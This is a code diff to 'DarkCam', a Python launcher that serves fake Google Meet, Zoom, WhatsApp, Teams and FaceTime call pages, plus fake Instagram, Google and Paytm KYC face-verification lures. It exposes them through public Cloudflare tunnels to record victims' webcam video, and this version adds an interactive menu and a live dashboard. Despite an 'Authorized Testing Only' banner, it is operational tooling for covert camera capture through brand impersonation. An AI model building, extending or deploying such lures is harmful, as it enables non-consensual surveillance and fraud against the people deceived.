@@ -19,6 +19,8 @@ _W = "\033[38;5;255m"   # bright white
 _D = "\033[38;5;240m"   # dim grey
 _B = "\033[1m"          # bold
 _R = "\033[0m"          # reset
+_C = "\033[38;5;39m"    # cyan blue
+_Y = "\033[38;5;226m"   # yellow
 
 IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or \
             os.path.exists("/data/data/com.termux")
@@ -27,6 +29,39 @@ BIN_DIR    = os.path.join(PREFIX, "bin")
 
 ALL_PAGES  = ["meet","zoom","whatsapp","instagram","omegle","teams",
               "telegram","facetime","instagram_verify","google_verify","paytm_kyc","captcha"]
+
+# ── Categories ────────────────────────────────────────────────
+CATEGORIES = {
+    "1": {
+        "label": "📹  Video Call Pages",
+        "desc":  "Fake video/audio call interfaces",
+        "pages": [
+            ("meet",      "📹", "Google Meet",        "Fake meeting join screen"),
+            ("zoom",      "💻", "Zoom",               "Waiting for host UI"),
+            ("whatsapp",  "📱", "WhatsApp",           "Incoming call from 'Rahul Sharma'"),
+            ("instagram", "📸", "Instagram",          "Live video call with LIVE badge"),
+            ("omegle",    "🌐", "Omegle",             "Random stranger video chat"),
+            ("teams",     "🟣", "Microsoft Teams",    "Corporate meeting — fake ID & Passcode"),
+            ("telegram",  "✈️ ", "Telegram",           "Incoming call with pulsing avatar"),
+            ("facetime",  "🍎", "FaceTime",           "Full-screen iOS-style call + PiP"),
+        ]
+    },
+    "2": {
+        "label": "🔐  Face Verification Pages",
+        "desc":  "KYC / account verification lures",
+        "pages": [
+            ("instagram_verify", "📸", "Instagram Verify", "Unusual activity — face scan + oval frame"),
+            ("google_verify",    "🔵", "Google Verify",    "New device login — identity confirm"),
+            ("paytm_kyc",        "💙", "Paytm KYC",        "Wallet limited — Full KYC + Aadhaar match"),
+            ("captcha",          "🛡️ ", "Cloudflare CAPTCHA","Bot check lure — 'Verify you are human'"),
+        ]
+    },
+    "3": {
+        "label": "🚀  All Pages Simultaneously",
+        "desc":  f"Launch all {len(ALL_PAGES)} lures with parallel tunnels",
+        "pages": []
+    },
+}
 
 BANNER = f"""
 {_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
@@ -41,11 +76,124 @@ BANNER = f"""
 {_G}  ░                                {_O} ░                               {_R}
 
 {_D}        ┌──────────────────────────────────────────────────────────────┐{_R}
-{_D}        │{_R}  {_O}{_B}🎥 DarkCam{_R}  {_D}•{_R}  {_W}Webcam Video Capture Framework{_R}  {_D}•{_R}  {_G}v1.0.0{_R}   {_D}│{_R}
+{_D}        │{_R}  {_O}{_B}🎥 DarkCam{_R}  {_D}•{_R}  {_W}Webcam Video Capture Framework{_R}  {_D}•{_R}  {_G}v1.1.0{_R}   {_D}│{_R}
 {_D}        │{_R}  {_W}Developed by{_R} {_O}{_B}Yaman.RedTeam{_R}  {_D}•{_R}  {_G}Authorized Testing Only{_R}      {_D}│{_R}
-{_D}        │{_R}  {_D}➜{_R} {_W}github.com/Yaman-RedTeam/darkcam{_R}  {_D}•{_R}  {_W}11 Lure Pages{_R}          {_D}│{_R}
+{_D}        │{_R}  {_D}➜{_R} {_W}github.com/Yaman-RedTeam/darkcam{_R}  {_D}•{_R}  {_W}12 Lure Pages{_R}          {_D}│{_R}
 {_D}        └──────────────────────────────────────────────────────────────┘{_R}
 """
+
+def clear():
+    os.system("clear" if os.name != "nt" else "cls")
+
+def print_step(n, total, title):
+    bar = _G + "━" * n + _D + "━" * (total - n) + _R
+    print(f"\n  {bar}")
+    print(f"  {_D}Step {n}/{total}{_R}  {_O}{_B}{title}{_R}\n")
+
+def ask(prompt, default=None):
+    hint = f" [{_C}{default}{_R}]" if default is not None else ""
+    try:
+        val = input(f"  {_O}❯{_R} {_W}{prompt}{hint}: {_R}").strip()
+    except (KeyboardInterrupt, EOFError):
+        print(f"\n\n  {_O}[!]{_R} Aborted.\n")
+        sys.exit(0)
+    return val if val else str(default) if default is not None else ""
+
+def separator(w=58):
+    print(f"  {_D}{'─' * w}{_R}")
+
+# ─────────────────────────────────────────────────────────────
+# STEP 1 — Choose category
+# ─────────────────────────────────────────────────────────────
+def step_category():
+    print_step(1, 3, "Select Lure Category")
+    for key, cat in CATEGORIES.items():
+        print(f"  {_O}{_B}[{key}]{_R}  {_W}{cat['label']}{_R}")
+        print(f"        {_D}{cat['desc']}{_R}\n")
+    separator()
+    choice = ask("Enter choice", "1")
+    if choice not in CATEGORIES:
+        print(f"\n  {_O}[!]{_R} Invalid choice. Defaulting to 1.")
+        choice = "1"
+    return choice
+
+# ─────────────────────────────────────────────────────────────
+# STEP 2 — Choose lure page (skipped for --all mode)
+# ─────────────────────────────────────────────────────────────
+def step_page(cat_key):
+    if cat_key == "3":
+        return None  # all mode
+
+    cat = CATEGORIES[cat_key]
+    pages = cat["pages"]
+
+    print_step(2, 3, f"Select Lure Page  —  {cat['label']}")
+    for i, (slug, icon, name, desc) in enumerate(pages, 1):
+        idx = f"{_O}{_B}[{i}]{_R}"
+        print(f"  {idx}  {icon}  {_W}{name:<22}{_R}  {_D}{desc}{_R}")
+    print()
+    separator()
+    choice = ask("Enter choice", "1")
+    try:
+        idx = int(choice) - 1
+        if idx < 0 or idx >= len(pages):
+            raise ValueError
+    except ValueError:
+        print(f"\n  {_O}[!]{_R} Invalid. Defaulting to 1.")
+        idx = 0
+    return pages[idx][0]  # return slug
+
+# ─────────────────────────────────────────────────────────────
+# STEP 3 — Configure & launch
+# ─────────────────────────────────────────────────────────────
+def step_config(cat_key, page_slug):
+    is_all = (cat_key == "3")
+
+    if is_all:
+        label = f"ALL {len(ALL_PAGES)} PAGES"
+    else:
+        # find label
+        for pages in [CATEGORIES["1"]["pages"], CATEGORIES["2"]["pages"]]:
+            for slug, icon, name, _ in pages:
+                if slug == page_slug:
+                    label = f"{icon}  {name}"
+                    break
+
+    print_step(3, 3, "Configure & Launch")
+    print(f"  {_D}Selected :{_R}  {_O}{_B}{label}{_R}")
+    print()
+
+    port_default = 8080
+    port_str = ask("Port", port_default)
+    try:
+        port = int(port_str)
+    except ValueError:
+        port = port_default
+
+    tunnel_ans = ask("Enable Cloudflare tunnel? (y/n)", "y").lower()
+    no_tunnel = tunnel_ans in ("n", "no")
+
+    duration_str = ask("Recording duration (seconds)", 45)
+    try:
+        duration = int(duration_str)
+    except ValueError:
+        duration = 45
+
+    separator()
+    print(f"\n  {_D}Summary:{_R}")
+    print(f"  {_D}  Lure     :{_R}  {_O}{label}{_R}")
+    print(f"  {_D}  Port     :{_R}  {port}")
+    print(f"  {_D}  Tunnel   :{_R}  {'Yes' if not no_tunnel else 'No (local only)'}")
+    print(f"  {_D}  Duration :{_R}  {duration}s per victim\n")
+
+    confirm = ask("Launch? (y/n)", "y").lower()
+    if confirm not in ("y", "yes", ""):
+        print(f"\n  {_O}[!]{_R} Cancelled.\n")
+        sys.exit(0)
+
+    return port, no_tunnel, duration
+
+# ─────────────────────────────────────────────────────────────
 
 def install_deps():
     req_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
@@ -237,6 +385,7 @@ def start_flask_single(page, port):
 
 def print_info(url, page, port, duration):
     env_label = f"{_O}Termux (Android){_R}" if IS_TERMUX else f"{_W}Linux{_R}"
+    live_url  = url.replace("https://","https://") + "/live" if url.startswith("http") else f"http://localhost:{port}/live"
     print(f"\n{_D}  ┌──────────────────────────────────────────────────────┐{_R}")
     print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM ACTIVE{_R}                                      {_D}│{_R}")
     print(f"{_D}  ├──────────────────────────────────────────────────────┤{_R}")
@@ -244,6 +393,7 @@ def print_info(url, page, port, duration):
     print(f"{_D}  │{_R}  {_D}Lure Page   :{_R}  {_O}{page.upper()}{_R}")
     print(f"{_D}  │{_R}  {_D}Local URL   :{_R}  http://localhost:{port}")
     print(f"{_D}  │{_R}  {_D}Public URL  :{_R}  {_W}{url}{_R}")
+    print(f"{_D}  │{_R}  {_D}Live Dash   :{_R}  {_C}{live_url}{_R}")
     print(f"{_D}  │{_R}  {_D}Output Dir  :{_R}  {os.path.abspath('output/')}")
     print(f"{_D}  │{_R}  {_D}Rec Duration:{_R}  {duration}s per victim")
     print(f"{_D}  └──────────────────────────────────────────────────────┘{_R}")
@@ -278,18 +428,15 @@ def run_all_mode(base_port, duration, no_tunnel):
     results = []
 
     print(f"\n  {_O}[*]{_R} Launching {len(ALL_PAGES)} Flask servers...")
-    # Kill existing processes on all ports first
     for i in range(len(ALL_PAGES)):
         subprocess.run(f"kill $(lsof -ti:{base_port+i}) 2>/dev/null", shell=True)
     time.sleep(0.5)
-    # Start all Flask servers in parallel
     flask_threads = []
     for i, page in enumerate(ALL_PAGES):
         port = base_port + i
         t = threading.Thread(target=start_flask, args=(page, port), daemon=True)
         t.start()
         flask_threads.append(t)
-    # Wait for all to be ready
     for t in flask_threads:
         t.join()
     for i, page in enumerate(ALL_PAGES):
@@ -297,7 +444,6 @@ def run_all_mode(base_port, duration, no_tunnel):
 
     if not no_tunnel:
         print(f"\n  {_O}[*]{_R} Starting {len(ALL_PAGES)} cloudflared tunnels (this takes ~30s)...")
-        # Start all tunnels in parallel
         tunnel_threads = []
         tunnel_results = [None] * len(ALL_PAGES)
 
@@ -334,49 +480,80 @@ def run_all_mode(base_port, duration, no_tunnel):
     print_all_info(results, duration)
     return tunnel_procs
 
+def interactive_menu():
+    """Step-by-step interactive lure selector. Returns (page, port, no_tunnel, duration, is_all)."""
+    clear()
+    print(BANNER)
+
+    if IS_TERMUX:
+        print(f"  {_O}[*]{_R} Termux environment detected.\n")
+
+    # Step 1 — category
+    cat_key = step_category()
+    is_all  = (cat_key == "3")
+
+    # Step 2 — page
+    page = step_page(cat_key)
+
+    # Step 3 — config
+    port, no_tunnel, duration = step_config(cat_key, page)
+
+    return page, port, no_tunnel, duration, is_all
+
 def main():
-    parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
-    parser.add_argument("--page", choices=ALL_PAGES, default="meet", help="Lure page template")
-    parser.add_argument("--all", action="store_true", help="Launch ALL 11 pages simultaneously")
-    parser.add_argument("--port", type=int, default=8080, help="Base port (--all uses port to port+10)")
+    parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool", add_help=True)
+    parser.add_argument("--page", choices=ALL_PAGES, help="Skip menu: use this lure page directly")
+    parser.add_argument("--all", action="store_true", help="Skip menu: launch ALL pages simultaneously")
+    parser.add_argument("--port", type=int, default=8080, help="Base port (default 8080)")
     parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
     parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
     args = parser.parse_args()
 
-    print(BANNER)
-
-    if IS_TERMUX:
-        print(f"  {_O}[*]{_R} Termux environment detected.")
-
-    install_deps()
-
-    if not args.no_tunnel:
-        check_cloudflared()
+    # ── If flags provided, skip the menu (legacy / scripted use) ──
+    if args.page or args.all:
+        print(BANNER)
+        if IS_TERMUX:
+            print(f"  {_O}[*]{_R} Termux environment detected.")
+        install_deps()
+        if not args.no_tunnel:
+            check_cloudflared()
+        page      = args.page or "meet"
+        port      = args.port
+        no_tunnel = args.no_tunnel
+        duration  = args.duration
+        is_all    = args.all
+    else:
+        # ── Interactive menu ──
+        page, port, no_tunnel, duration, is_all = interactive_menu()
+        print()
+        install_deps()
+        if not no_tunnel:
+            check_cloudflared()
 
     tunnel_procs = []
 
     # ── ALL MODE ──
-    if args.all:
-        tunnel_procs = run_all_mode(args.port, args.duration, args.no_tunnel)
+    if is_all:
+        tunnel_procs = run_all_mode(port, duration, no_tunnel)
 
     # ── SINGLE MODE ──
     else:
-        subprocess.run(f"kill $(lsof -ti:{args.port}) 2>/dev/null", shell=True)
+        subprocess.run(f"kill $(lsof -ti:{port}) 2>/dev/null", shell=True)
         time.sleep(0.3)
-        print(f"  {_G}[+]{_R} Starting Flask server on port {args.port}...")
-        start_flask_single(args.page, args.port)
+        print(f"  {_G}[+]{_R} Starting Flask server on port {port}...")
+        start_flask_single(page, port)
         print(f"  {_G}[+]{_R} Flask server running.")
 
-        public_url = f"http://localhost:{args.port}"
-        if not args.no_tunnel:
+        public_url = f"http://localhost:{port}"
+        if not no_tunnel:
             print(f"  {_O}[*]{_R} Starting cloudflared tunnel...")
-            public_url, proc = start_tunnel(args.port)
+            public_url, proc = start_tunnel(port)
             if not public_url:
                 print(f"  {_G}[-]{_R} Could not get tunnel URL. Use --no-tunnel for local only.")
                 sys.exit(1)
             tunnel_procs.append(proc)
 
-        print_info(public_url, args.page, args.port, args.duration)
+        print_info(public_url, page, port, duration)
 
     def cleanup(sig=None, frame=None):
         print(f"\n\n  {_O}[!]{_R} Shutting down DarkCam...")
